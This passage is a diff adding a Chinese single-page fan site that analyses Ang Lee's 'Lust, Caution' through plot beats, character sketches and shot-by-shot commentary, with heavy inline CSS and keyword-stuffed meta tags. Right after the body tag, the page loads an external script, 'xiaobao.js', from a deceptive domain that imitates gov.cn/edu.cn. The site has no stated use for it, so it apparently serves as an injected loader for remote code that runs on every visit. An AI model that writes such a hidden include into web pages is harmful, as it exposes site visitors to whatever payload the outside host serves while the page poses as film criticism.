@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="色戒电影网 sejiedianyingwang-cn 专注李安电影《色，戒》的深度解读：完整剧情脉络、人物心理分析、镜头语言拆解、历史背景、原著对照、争议与分级说明，以及同类华语伦理电影片单。">
+<meta name="keywords" content="色戒电影网,色戒电影,色戒 李安,色戒 剧情解析,色戒 人物分析,色戒 镜头语言,色戒 历史背景,色戒 张爱玲,色戒 梁朝伟 汤唯,色戒 分级,华语伦理电影,sejiedianyingwang-cn">
+<meta name="author" content="色戒电影网">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>色戒电影网 - sejiedianyingwang-cn | 《色，戒》深度解读与华语伦理电影</title>
+<link rel="canonical" href="https://域名.github.io/">
+<style>
+/* ==========================================================
+   色戒电影网  sejiedianyingwang-cn
+   单页式站点（锚点导航），移动端自适应
+   CSS / DOM 结构 / 视觉方案 全部内联、彼此独立
+   按约定不生成 robots.txt 与 sitmap.xml
+   ========================================================== */
+
+/* ---------- 变量与重置 ---------- */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#17131c;
+  --ink-2:#2c2433;
+  --jade:#2f6f63;
+  --jade-2:#5b9c8c;
+  --plum:#7a3b5e;
+  --rouge:#a5283c;
+  --gold:#d8a85c;
+  --gold-2:#f0d6a8;
+  --paper:#f4efe9;
+  --paper-2:#ebe3d8;
+  --line:#d6cbba;
+  --line-2:#b8a894;
+  --txt:#2c2433;
+  --dim:#6d6270;
+  --dim-2:#938894;
+  --radius:14px;
+  --shadow:0 24px 50px rgba(23,19,28,.24);
+  --ease:cubic-bezier(.2,.72,.3,1);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--paper);color:var(--txt);line-height:1.85;overflow-x:hidden;
+  background-image:
+    radial-gradient(640px 440px at 92% -8%,rgba(216,168,92,.28),transparent 62%),
+    radial-gradient(560px 400px at 6% 4%,rgba(122,59,94,.14),transparent 64%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol{list-style:none}
+img,svg,figure{display:block;max-width:100%}
+button{font-family:inherit;background:none;border:none;color:inherit;cursor:pointer}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-thumb{background:rgba(165,40,60,.4);border-radius:8px}
+::-webkit-scrollbar-track{background:transparent}
+
+/* ---------- 容器与标题 ---------- */
+.box{width:100%;max-width:1180px;margin:0 auto;padding:0 22px}
+.block{padding:90px 0;position:relative}
+.kicker{display:inline-flex;align-items:center;gap:9px;font-size:11px;letter-spacing:.28em;color:var(--rouge);font-weight:800}
+.kicker::before{content:"";width:22px;height:2px;background:var(--rouge);border-radius:2px}
+.heading{font-size:clamp(26px,4.4vw,42px);line-height:1.3;font-weight:900;letter-spacing:-.5px;margin:12px 0 10px}
+.heading em{font-style:normal;color:var(--jade)}
+.intro{color:var(--dim);max-width:680px;font-size:15px}
+.bar{width:56px;height:3px;border-radius:3px;background:linear-gradient(90deg,var(--rouge),var(--gold));margin:14px 0 28px}
+.edge{position:absolute;left:0;right:0;height:16px;background:repeating-linear-gradient(45deg,var(--jade) 0 6px,var(--gold) 6px 12px);opacity:.5;pointer-events:none}
+.edge.top{top:0}.edge.bot{bottom:0}
+
+/* ---------- 导航 ---------- */
+.topbar{position:fixed;inset:0 0 auto 0;z-index:100;background:rgba(244,239,233,.92);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid var(--line);transition:box-shadow .3s var(--ease)}
+.topbar.stuck{box-shadow:0 10px 28px rgba(23,19,28,.16)}
+.top-row{display:flex;align-items:center;gap:20px;height:64px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:950;letter-spacing:.3px;font-size:17px;color:var(--ink)}
+.logo .seal{font-size:9px;letter-spacing:.1em;font-weight:900;color:#fff;background:var(--jade);border-radius:50%;width:26px;height:26px;display:grid;place-items:center;flex:none}
+.logo small{color:var(--dim-2);font-size:10px;letter-spacing:.06em;font-weight:700}
+.top-links{display:flex;gap:4px;margin-left:auto;align-items:center}
+.top-links a{font-size:14px;color:var(--dim);padding:9px 14px;border-radius:10px;transition:.25s var(--ease);font-weight:600}
+.top-links a:hover{color:var(--rouge);background:rgba(165,40,60,.06)}
+.top-links a.now{color:#fff;background:var(--jade);box-shadow:0 6px 14px rgba(47,111,99,.32)}
+.top-cta{font-size:13px;font-weight:800;padding:9px 19px;border-radius:10px;border:1.5px solid var(--ink);transition:.25s var(--ease);color:var(--ink)}
+.top-cta:hover{background:var(--ink);color:var(--gold-2);transform:translateY(-2px)}
+.burger{display:none;width:42px;height:42px;border:1.5px solid var(--ink);border-radius:10px;background:var(--paper-2);cursor:pointer;flex-direction:column;gap:5px;place-items:center;margin-left:auto}
+.burger i{width:18px;height:2px;background:var(--ink);border-radius:2px;transition:.3s var(--ease)}
+
+/* ---------- Hero ---------- */
+.hero{min-height:100vh;display:grid;place-items:center;padding:120px 0 80px;position:relative;overflow:hidden}
+.brush{position:absolute;font-family:"STKaiti","KaiTi","AR PL UKai CN",serif;font-weight:900;line-height:1;opacity:.1;pointer-events:none;writing-mode:vertical-rl;letter-spacing:.1em}
+.brush.b1{right:5%;top:12%;font-size:170px;color:var(--rouge)}
+.brush.b2{left:3%;bottom:6%;font-size:120px;color:var(--jade)}
+@keyframes ink{50%{opacity:.22}}
+.brush{animation:ink 6s infinite}
+.marquee{position:absolute;left:0;right:0;bottom:0;overflow:hidden;border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--ink);color:var(--gold-2);font-size:12.5px;letter-spacing:.14em;padding:9px 0;white-space:nowrap}
+.marquee span{display:inline-block;padding-right:44px;animation:mq 32s linear infinite}
+@keyframes mq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:54px;align-items:center;position:relative;z-index:2}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:11.5px;color:var(--dim);border:1px solid var(--line-2);border-radius:999px;padding:7px 15px;background:var(--paper)}
+.eyebrow s{width:7px;height:7px;border-radius:50%;background:var(--rouge);box-shadow:0 0 10px var(--rouge);animation:blip 1.6s infinite}
+@keyframes blip{50%{opacity:.25;transform:scale(.75)}}
+.hero h1{font-size:clamp(34px,6vw,60px);line-height:1.16;font-weight:950;letter-spacing:-1.4px;margin:18px 0 16px}
+.hero h1 .jd{color:var(--jade)}
+.hero p{font-size:clamp(15px,1.6vw,17px);color:var(--dim);max-width:540px}
+.acts{display:flex;flex-wrap:wrap;gap:14px;margin-top:28px}
+.btn{display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:15px;padding:15px 29px;border-radius:11px;border:1.5px solid transparent;transition:.28s var(--ease)}
+.btn-main{background:var(--jade);color:#fff;box-shadow:0 12px 26px rgba(47,111,99,.34)}
+.btn-main:hover{transform:translateY(-3px);background:var(--jade-2)}
+.btn-line{border-color:var(--ink);color:var(--ink);background:var(--paper)}
+.btn-line:hover{border-color:var(--rouge);color:var(--rouge);transform:translateY(-3px)}
+.tags{display:flex;gap:9px;margin-top:26px;flex-wrap:wrap}
+.tags span{font-size:12.5px;color:var(--dim);border:1px dashed var(--line-2);border-radius:6px;padding:6px 12px;cursor:pointer;transition:.2s var(--ease)}
+.tags span:hover{color:var(--jade);border-color:var(--jade);border-style:solid}
+.nums{display:flex;gap:34px;margin-top:34px;flex-wrap:wrap}
+.num span{display:block;font-size:10.5px;letter-spacing:.16em;color:var(--dim-2)}
+.num b{font-size:25px;font-weight:950;color:var(--rouge);font-family:"DIN Alternate","Arial Black",sans-serif}
+
+/* 印章式主视觉 */
+.seal-art{position:relative;width:300px;height:300px;margin:0 auto;display:grid;place-items:center}
+.seal-art .ring{position:absolute;inset:0;border:2px solid var(--rouge);border-radius:50%;opacity:.7}
+.seal-art .ring.r2{inset:16px;border-color:var(--gold);opacity:.55}
+.seal-art .glyph{position:relative;font-family:"STKaiti","KaiTi","AR PL UKai CN",serif;font-size:118px;font-weight:900;color:var(--rouge);line-height:1;text-shadow:2px 2px 0 var(--gold-2)}
+.seal-art .quad{position:absolute;width:34px;height:34px;border:1.5px solid var(--jade)}
+.seal-art .quad.q1{top:14px;left:14px;border-right:none;border-bottom:none}
+.seal-art .quad.q2{top:14px;right:14px;border-left:none;border-bottom:none}
+.seal-art .quad.q3{bottom:14px;left:14px;border-right:none;border-top:none}
+.seal-art .quad.q4{bottom:14px;right:14px;border-left:none;border-top:none}
+.seal-note{text-align:center;margin-top:22px;font-size:12.5px;color:var(--dim-2);letter-spacing:.1em}
+
+/* ---------- 通用头部 ---------- */
+.head-flex{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:32px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap}
+.tab{font-size:13px;font-weight:700;padding:8px 16px;border-radius:9px;cursor:pointer;border:1px solid var(--line-2);color:var(--dim);background:var(--paper);transition:.25s var(--ease)}
+.tab:hover{color:var(--jade);border-color:var(--jade)}
+.tab.on{color:#fff;border-color:transparent;background:var(--jade)}
+
+/* ---------- 栏目一：剧情脉络（竖向时间轴） ---------- */
+.axis{display:grid;gap:0;position:relative;padding-left:26px}
+.axis::before{content:"";position:absolute;left:7px;top:14px;bottom:14px;width:2px;background:linear-gradient(180deg,var(--jade),var(--gold),var(--rouge))}
+.beat{position:relative;background:var(--paper);border:1px solid var(--line);border-radius:13px;padding:18px 22px;margin-bottom:16px;transition:.32s var(--ease);cursor:pointer}
+.beat:last-child{margin-bottom:0}
+.beat::before{content:"";position:absolute;left:-24px;top:24px;width:14px;height:14px;border-radius:50%;background:var(--paper);border:3.5px solid var(--jade);transition:.3s var(--ease)}
+.beat:hover{transform:translateX(7px);border-color:var(--line-2);box-shadow:var(--shadow)}
+.beat:hover::before{border-color:var(--rouge);background:var(--rouge)}
+.beat time{font-size:11px;font-weight:950;letter-spacing:.16em;color:var(--jade);font-family:"DIN Alternate","Arial Black",sans-serif}
+.beat h3{font-size:17.5px;font-weight:950;margin:5px 0 8px}
+.beat p{font-size:13.5px;color:var(--dim);line-height:1.8}
+.beat .key{display:inline-block;margin-top:10px;font-size:11.5px;font-weight:800;letter-spacing:.06em;color:var(--rouge);border-bottom:1px dashed var(--line-2);padding-bottom:2px}
+
+/* ---------- 栏目二：人物关系（节点关系网） ---------- */
+.web{position:relative;display:grid;grid-template-columns:repeat(3,1fr);gap:18px;align-items:stretch}
+.node{background:var(--paper);border:1px solid var(--line);border-radius:13px;padding:20px;transition:.35s var(--ease);position:relative}
+.node:hover{transform:translateY(-6px);box-shadow:var(--shadow);border-color:var(--line-2)}
+.node .role{font-size:10.5px;letter-spacing:.18em;color:var(--jade);font-weight:900}
+.node h3{font-size:20px;font-weight:950;margin:6px 0 10px}
+.node p{font-size:13.5px;color:var(--dim);line-height:1.8}
+.node .wire{position:absolute;top:0;left:0;width:100%;height:5px;border-radius:13px 13px 0 0;background:linear-gradient(90deg,var(--jade),var(--gold))}
+.node.n2 .wire{background:linear-gradient(90deg,var(--rouge),var(--plum))}
+.node.n3 .wire{background:linear-gradient(90deg,var(--gold),var(--rouge))}
+.node .pill{display:inline-block;margin-top:12px;font-size:11.5px;padding:5px 11px;border-radius:999px;background:rgba(47,111,99,.1);color:var(--jade);font-weight:700}
+.node.n2 .pill{background:rgba(165,40,60,.1);color:var(--rouge)}
+.node.n3 .pill{background:rgba(216,168,92,.26);color:#8a6220}
+
+/* ---------- 栏目三：镜头语言（对照表式 Grid） ---------- */
+.shots{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:var(--paper)}
+.shot{border-bottom:1px solid var(--line);border-right:1px solid var(--line);padding:22px 24px;transition:.3s var(--ease);cursor:pointer;display:grid;grid-template-columns:58px 1fr;gap:16px;align-items:start}
+.shot:nth-child(odd){border-right:none}
+.shot:nth-last-child(-n+2){border-bottom:none}
+.shot:hover{background:linear-gradient(135deg,rgba(216,168,92,.18),rgba(165,40,60,.04))}
+.shot .no{font-family:"DIN Alternate","Arial Black",sans-serif;font-size:26px;font-weight:950;color:var(--gold);line-height:1}
+.shot h4{font-size:16.5px;font-weight:950}
+.shot p{font-size:13px;color:var(--dim);line-height:1.78;margin-top:6px}
+
+/* ---------- 栏目四：历史与文本（三折页） ---------- */
+.fold{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.page{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);padding:24px 22px;transition:.35s var(--ease);position:relative;overflow:hidden}
+.page::after{content:"";position:absolute;right:-30px;top:-30px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,rgba(216,168,92,.3),transparent 70%)}
+.page:hover{transform:translateY(-6px);box-shadow:var(--shadow);border-color:var(--line-2)}
+.page .tag{font-size:10.5px;letter-spacing:.2em;font-weight:900;color:#fff;background:var(--jade);border-radius:4px;padding:5px 10px}
+.page.t2 .tag{background:var(--rouge)}
+.page.t3 .tag{background:var(--plum)}
+.page h3{font-size:18.5px;line-height:1.5;font-weight:950;margin:12px 0 10px}
+.page p{font-size:13.5px;color:var(--dim);line-height:1.82}
+.page .more{display:inline-block;margin-top:14px;font-size:12.5px;font-weight:800;color:var(--jade)}
+.page.t2 .more{color:var(--rouge)}
+.page.t3 .more{color:var(--plum)}
+
+/* ---------- 栏目五：延伸片单（吸附滑轨 + 提示卡） ---------- */
+.pick-wrap{position:relative;padding:26px 0 30px;margin:0 -22px;padding-left:22px;padding-right:22px}
+.pick-track{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory}
+.pick-track::-webkit-scrollbar-thumb{background:var(--jade)}
+.card{flex:0 0 244px;scroll-snap-align:start;background:var(--ink);border-radius:12px;overflow:hidden;cursor:pointer;transition:.32s var(--ease)}
+.card:hover{transform:translateY(-7px);box-shadow:0 20px 42px rgba(23,19,28,.36)}
+.card .post{aspect-ratio:3/4;position:relative;overflow:hidden}
+.card .post .fill{position:absolute;inset:0;transition:.55s var(--ease)}
+.card:hover .post .fill{transform:scale(1.06)}
+.card .post .yr{position:absolute;top:10px;left:10px;font-size:10.5px;font-weight:950;letter-spacing:.1em;color:var(--ink);background:var(--gold-2);border-radius:4px;padding:4px 8px}
+.card figcaption{padding:14px 16px;color:var(--gold-2)}
+.card figcaption h4{font-size:15.5px;font-weight:900}
+.card figcaption small{display:block;margin-top:5px;font-size:11.5px;color:#c9c0b2;letter-spacing:.05em}
+
+.guide-note{display:grid;grid-template-columns:300px 1fr;gap:28px;align-items:center;margin-top:34px}
+.note-card{background:linear-gradient(155deg,var(--jade),var(--plum));color:#fff;border-radius:15px;padding:26px 28px;box-shadow:var(--shadow)}
+.note-card h4{font-size:19px;font-weight:950;margin-bottom:10px}
+.note-card p{font-size:13.5px;line-height:1.85;color:#f0e8ee}
+.flow-txt{display:grid;gap:12px}
+.flow-txt .row{display:grid;grid-template-columns:52px 1fr;gap:14px;background:var(--paper);border:1px solid var(--line);border-radius:11px;padding:13px 18px;transition:.28s var(--ease)}
+.flow-txt .row:hover{transform:translateX(6px);border-color:var(--line-2)}
+.flow-txt .row b{font-family:"DIN Alternate","Arial Black",sans-serif;font-size:19px;color:var(--rouge);letter-spacing:.05em}
+.flow-txt .row span{font-size:13.5px;color:var(--dim)}
+
+/* ---------- 页脚 ---------- */
+.foot{position:relative;padding:70px 0 30px;border-top:1px solid var(--line);margin-top:36px;background:linear-gradient(180deg,transparent,rgba(216,168,92,.24))}
+.foot-grid{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:34px;margin-bottom:40px}
+.foot-brand p{font-size:13.5px;color:var(--dim);margin-top:14px;max-width:300px}
+.foot-col h5{font-size:12px;letter-spacing:.16em;color:var(--jade);margin-bottom:15px;font-weight:950}
+.foot-col a{display:block;font-size:13.5px;color:var(--dim);padding:6px 0;transition:.2s var(--ease);border-bottom:1px solid transparent}
+.foot-col a:hover{color:var(--rouge);border-bottom-color:var(--line-2);transform:translateX(4px)}
+.copy{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:22px;border-top:1px solid var(--line);font-size:12.5px;color:var(--dim-2)}
+.copy b{color:var(--rouge)}
+
+/* ---------- 回到顶部 ---------- */
+.up{position:fixed;right:20px;bottom:24px;z-index:90;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;cursor:pointer;border:1.5px solid var(--ink);background:var(--gold);color:var(--ink);box-shadow:var(--shadow);opacity:0;visibility:hidden;transform:translateY(14px);transition:.35s var(--ease);font-weight:900}
+.up.show{opacity:1;visibility:visible;transform:translateY(0)}
+.up:hover{background:var(--jade);color:#fff}
+
+/* ---------- 入场动效 ---------- */
+.show-up{opacity:0;transform:translateY(26px);transition:.7s var(--ease)}
+.show-up.in{opacity:1;transform:none}
+
+/* ---------- 响应式 ---------- */
+@media (max-width:960px){
+  .box{padding:0 18px}
+  .block{padding:66px 0}
+  .hero-grid,.guide-note{grid-template-columns:1fr;gap:46px}
+  .web,.fold,.shots{grid-template-columns:1fr;gap:16px}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:26px}
+  .brush.b1{font-size:104px;right:-12%}
+  .brush.b2{font-size:78px}
+  .shot{border-right:none}
+  .shot:nth-last-child(-n+2){border-bottom:1px solid var(--line)}
+  .shot:last-child{border-bottom:none}
+}
+@media (max-width:680px){
+  .burger{display:grid}
+  .top-links{position:fixed;inset:64px 0 0 0;flex-direction:column;align-items:stretch;padding:24px 20px;gap:10px;background:rgba(244,239,233,.99);backdrop-filter:blur(14px);transform:translateX(100%);transition:.4s var(--ease);border-top:1px solid var(--line)}
+  .top-links.open{transform:none}
+  .top-links a{font-size:16px;padding:14px 18px;border-radius:11px}
+  .top-cta{text-align:center;justify-content:center;padding:14px}
+  .hero{padding:106px 0 62px;min-height:auto}
+  .hero h1{font-size:33px}
+  .seal-art{width:232px;height:232px}
+  .seal-art .glyph{font-size:88px}
+  .acts .btn{flex:1;justify-content:center;padding:13px 20px;font-size:14px}
+  .foot-grid{grid-template-columns:1fr;gap:22px}
+  .copy{flex-direction:column;text-align:center}
+  .nums{gap:20px}.num b{font-size:21px}
+  .pick-wrap,.pick-track{margin:0 -18px;padding-left:18px;padding-right:18px}
+  .card{flex-basis:210px}
+  .axis{padding-left:22px}
+}
+@media print{
+  .topbar,.up,.burger,.marquee{display:none}
+  body{background:#fff;color:#000}
+  .block{padding:26px 0}
+  a{color:#000}
+  .beat,.node,.shot,.page,.row,.card{background:#fff;border-color:#bbb;box-shadow:none}
+  .brush{opacity:.14}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 顶部导航 ==================== -->
+<header class="topbar" id="topbar">
+  <div class="box top-row">
+    <a class="logo" href="#top" aria-label="色戒电影网 首页">
+      <span class="seal" aria-hidden="true">戒</span>色戒电影网<small>SEJIEDIANYINGWANG-CN</small>
+    </a>
+    <button class="burger" id="burger" aria-label="切换菜单" aria-expanded="false">
+      <i></i><i></i><i></i>
+    </button>
+    <nav class="top-links" id="topLinks" aria-label="主导航">
+      <a href="#plot">剧情脉络</a>
+      <a href="#cast">人物关系</a>
+      <a href="#shot">镜头语言</a>
+      <a href="#context">历史与文本</a>
+      <a href="#more">延伸片单</a>
+      <a href="#" class="top-cta">收藏片单</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ==================== Hero ==================== -->
+<section class="hero" id="home" aria-labelledby="heroTitle">
+  <span class="brush b1" aria-hidden="true">色</span>
+  <span class="brush b2" aria-hidden="true">戒</span>
+
+  <div class="box hero-grid">
+    <div class="show-up">
+      <span class="eyebrow"><s></s>李安 · 2007 · 威尼斯金狮</span>
+      <h1>读懂<em class="jd">《色，戒》</em>，<br>才读懂欲望与信仰之间那三秒。</h1>
+      <p>色戒电影网（sejiedianyingwang-cn）只做一件事：把李安的电影《色，戒》讲透。从王佳芝的心理转折，到那场改变一切的戏中戏；从张爱玲原著的冷笔，到 1940 年代上海与香港的历史褶皱——剧情、人物、镜头、文本、分级，逐层拆开。</p>
+      <div class="acts">
+        <a class="btn btn-main" href="#plot">从剧情开始</a>
+        <a class="btn btn-line" href="#context">历史背景</a>
+      </div>
+      <div class="tags" aria-label="常访话题">
+        <span>王佳芝</span><span>易先生</span><span>张爱玲</span><span>身体政治</span><span>镜头语言</span><span>III 级分级</span><span>华语伦理片</span>
+      </div>
+      <div class="nums">
+        <div class="num"><span>剧情节拍</span><b>06</b></div>
+        <div class="num"><span>人物深读</span><b>03</b></div>
+        <div class="num"><span>镜头拆解</span><b>08</b></div>
+        <div class="num"><span>延伸片单</span><b>07</b></div>
+      </div>
+    </div>
+
+    <figure class="seal-art show-up" aria-label="色戒 朱红印章">
+      <span class="ring" aria-hidden="true"></span>
+      <span class="ring r2" aria-hidden="true"></span>
+      <span class="glyph">戒</span>
+      <span class="quad q1" aria-hidden="true"></span>
+      <span class="quad q2" aria-hidden="true"></span>
+      <span class="quad q3" aria-hidden="true"></span>
+      <span class="quad q4" aria-hidden="true"></span>
+      <figcaption class="seal-note">一枚印章，两重心事：色是诱饵，戒是答案</figcaption>
+    </figure>
+  </div>
+
+  <div class="marquee" aria-hidden="true">
+    <span>色戒电影网 · 色戒电影 · 李安 色戒 · 色戒 剧情解析 · 色戒 人物分析 · 色戒 镜头语言 · 色戒 历史背景 · 色戒 张爱玲 原著 · 梁朝伟 汤唯 · III 级分级 · 华语伦理电影 · sejiedianyingwang-cn · 为认真看电影的人而做&nbsp;&nbsp;</span>
+  </div>
+</section>
+
+<!-- ==================== 栏目一：剧情脉络 ==================== -->
+<section class="block" id="plot" aria-labelledby="tPlot">
+  <span class="edge top" aria-hidden="true"></span>
+  <div class="box">
+    <header class="head-flex show-up">
+      <div>
+        <span class="kicker">01 / PLOT</span>
+        <h2 class="heading" id="tPlot">剧情<em>脉络</em> · 六拍，一场没有退路的戏</h2>
+        <p class="intro">不剧透式导读：只标出情绪转折点，不揭穿关键选择。适合二刷前先看，带着问题进影院。</p>
+        <div class="bar"></div>
+      </div>
+      <div class="tabs" role="tablist">
+        <button class="tab on" role="tab" aria-selected="true">全部节拍</button>
+        <button class="tab" role="tab">上海篇</button>
+        <button class="tab" role="tab">香港篇</button>
+      </div>
+    </header>
+
+    <div class="axis">
+      <article class="beat show-up">
+        <time>BEAT 01</time>
+        <h3>课室里的密谋：爱国学生的第一场"戏"</h3>
+        <p>一群岭南大学的学生决定刺杀汉奸，王佳芝被推上舞台饰演"麦太太"。从这一刻起，她的人生被分成两个版本：台上的角色，与台下不敢承认的自己。</p>
+        <span class="key">关键词：表演 / 身份 / 被选中</span>
+      </article>
+      <article class="beat show-up">
+        <time>BEAT 02</time>
+        <h3>香港三年：从"演"到"成为"</h3>
+        <p>演戏需要练习，而练习需要真实。当角色开始索取演员的私域，界限便模糊了。李安在这里用的全是"等待"的镜头——欲望不是爆发，是积攒。</p>
+        <span class="key">关键词：越界 / 等待 / 身体</span>
+      </article>
+      <article class="beat show-up">
+        <time>BEAT 03</time>
+        <h3>重逢上海：角色被重新分配</h3>
+        <p>三年后各奔东西，任务重启。王佳芝仍是"麦太太"，却已不是同一个人。她与易先生的关系，从猎人与猎物，悄悄变成了共谋。</p>
+        <span class="key">关键词：权力 / 共谋 / 危险</span>
+      </article>
+      <article class="beat show-up">
+        <time>BEAT 04</time>
+        <h3>珠宝店那一幕：三秒的犹豫</h3>
+        <p>全片的心理支点。一枚戒指、一句"你跟我走"、一个未被说出的"快走"。这三秒里，信仰、欲望、孤独同时作出判决。</p>
+        <span class="key">关键词：戒指 / 三秒 / 判决</span>
+      </article>
+      <article class="beat show-up">
+        <time>BEAT 05</time>
+        <h3>结局的两种孤独</h3>
+        <p>她走向刑场，他回到空房间。两个人都没有赢：一个死于自己的心软，一个活在自己的牢笼。李安不给悲壮，只给安静。</p>
+        <span class="key">关键词：牺牲 / 牢笼 / 安静</span>
+      </article>
+      <article class="beat show-up">
+        <time>BEAT 06</time>
+        <h3>张爱玲的冷笔：原著比电影更残忍</h3>
+        <p>小说写于 1950 年，只万余字，结尾一句"得到一个终身的教训"冷到刺骨。李安把冷笔拍成了热气——这是改编最勇敢的地方。</p>
+        <span class="key">关键词：改编 / 冷笔 / 热气</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目二：人物关系 ==================== -->
+<section class="block" id="cast" style="background:linear-gradient(180deg,transparent,rgba(216,168,92,.22))" aria-labelledby="tCast">
+  <div class="box">
+    <header class="head-flex show-up">
+      <div>
+        <span class="kicker">02 / CHARACTER</span>
+        <h2 class="heading" id="tCast">人物<em>关系</em> · 三个人的三角，没有一个是赢家</h2>
+        <p class="intro">《色，戒》的核心不是"美人计"，而是"谁在利用谁"。三个人物，三种孤独，三种对"真实"的定义。</p>
+        <div class="bar"></div>
+      </div>
+    </header>
+
+    <div class="web">
+      <article class="node show-up">
+        <span class="wire" aria-hidden="true"></span>
+        <span class="role">王佳芝 · 饰演者 汤唯</span>
+        <h3>她不是在演戏，<br>她是被戏演</h3>
+        <p>从话剧社的台柱，到刺杀行动的诱饵。她的悲剧不在于爱上了目标，而在于她从未被任何人真正需要过——除了在那张床上。</p>
+        <span class="pill">孤独 · 被使用 · 自我消解</span>
+      </article>
+      <article class="node n2 show-up">
+        <span class="wire" aria-hidden="true"></span>
+        <span class="role">易先生 · 饰演者 梁朝伟</span>
+        <h3>他给的是掌控，<br>不是爱</h3>
+        <p>特务头子的温柔是权力的变形。他看穿了她的身份，却仍走进那间公寓——因为他也需要一个"不被需要"之外的瞬间。最后那句"她真是不走运"，是全片最冷的一刀。</p>
+        <span class="pill">掌控 · 猜疑 · 牢笼</span>
+      </article>
+      <article class="node n3 show-up">
+        <span class="wire" aria-hidden="true"></span>
+        <span class="role">邝裕民 · 饰演者 王力宏</span>
+        <h3>理想主义者，<br>往往最残忍</h3>
+        <p>他把王佳芝推上舞台，又在她最需要时被"大局"说服。他的爱国是干净的，干净到看不见一个人的代价。他是这场悲剧真正的共犯。</p>
+        <span class="pill">理想 · 逃避 · 共犯</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目三：镜头语言 ==================== -->
+<section class="block" id="shot" aria-labelledby="tShot">
+  <div class="box">
+    <header class="head-flex show-up">
+      <div>
+        <span class="kicker">03 / SHOT</span>
+        <h2 class="heading" id="tShot">镜头<em>语言</em> · 李安藏了什么在画面里</h2>
+        <p class="intro">伦理片的力气不在台词。以下八处，是二刷时最值得暂停的画面——它们替人物说出了不敢说的话。</p>
+        <div class="bar"></div>
+      </div>
+      <div class="tabs" role="tablist">
+        <button class="tab on" role="tab" aria-selected="true">构图</button>
+        <button class="tab" role="tab">光影</button>
+        <button class="tab" role="tab">声音</button>
+      </div>
+    </header>
+
+    <div class="shots">
+      <article class="shot show-up">
+        <div class="no">01</div>
+        <div>
+          <h4>门框构图：她永远在"被进入"</h4>
+          <p>王佳芝多次被拍在门框之内，门框成为画中画。她不是走进房间，而是被房间吞进去——空间的压迫，就是命运的压迫。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">02</div>
+        <div>
+          <h4>背影与后颈：欲望的入口</h4>
+          <p>李安极少拍正面激情，多拍肩背、后颈、手指。被凝视的不是身体，而是"一个人放下防备的瞬间"。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">03</div>
+        <div>
+          <h4>麻将桌：权力的圆桌会议</h4>
+          <p>太太们的牌局是全片最锋利的场景。笑里藏刀、话里有话，易太太的每一句恭维都是审讯。镜头不动，人心在动。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">04</div>
+        <div>
+          <h4>珠宝店的镜子：两个人的倒影</h4>
+          <p>试戒那一幕，镜子把两人叠在同一平面。没有对视，却比任何对视都近——这是全片唯一一次"平等"。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">05</div>
+        <div>
+          <h4>长镜头的喘息：一场戏，一条过</h4>
+          <p>关键几场采用长镜头，不剪断人物的呼吸。观众被迫"在场"，无法用剪辑逃避尴尬与疼痛。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">06</div>
+        <div>
+          <h4>声音的缺席：沉默比台词重</h4>
+          <p>结尾易先生独自坐在床上，没有配乐，只有布料摩擦与远处车声。声音设计在这里完成的，是"孤独的证词"。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">07</div>
+        <div>
+          <h4>色彩隐喻：红与青的对峙</h4>
+          <p>旗袍的红、公寓的青、珠宝店的暖金——三种色温对应三种心理状态。王佳芝最后一次穿的，是那件最红的。</p>
+        </div>
+      </article>
+      <article class="shot show-up">
+        <div class="no">08</div>
+        <div>
+          <h4>空镜收尾：房间比人诚实</h4>
+          <p>最后一个镜头回到那间公寓的空床。李安不给结论，只给"人走后的证据"。看懂这个空镜，才看懂整部电影。</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目四：历史与文本 ==================== -->
+<section class="block" id="context" style="background:linear-gradient(180deg,rgba(165,40,60,.05),transparent)" aria-labelledby="tContext">
+  <div class="box">
+    <header class="head-flex show-up">
+      <div>
+        <span class="kicker">04 / CONTEXT</span>
